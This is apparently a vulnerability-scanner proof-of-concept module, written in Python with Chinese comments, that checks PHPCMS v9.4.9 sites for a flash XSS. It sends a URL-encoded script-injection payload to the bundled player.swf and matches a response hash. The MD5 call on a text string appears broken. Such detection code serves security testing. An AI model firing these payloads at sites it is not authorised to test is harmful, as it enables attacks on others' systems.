# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.parse
import urllib.error
import hashlib


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0004'  # 平台漏洞编号，留空
    name = 'PHPCMS v9.4.9 flash xss'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        PHPCMS v9.4.9 flash xss漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'v9.4.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0444fa97-557e-4e4e-9561-e815c2296182'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            md5_check_value = 'cf00b069e36e756705c49b3a3bf20c40'
            payload = urllib.parse.unquote(
                "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
            #code, head, res, errcode, _ = curl.curl(url+payload)
            r = requests.get(self.target + payload)
            if r.status_code == 200:
                md5_buff = hashlib.md5(r.text).hexdigest()
                self.output.info('Payload md5 {}'.format(md5_buff))
                if md5_buff in md5_check_value:
                    #security_info(url + 'phpcms v9.4.9 flash xss')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))
            raise

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
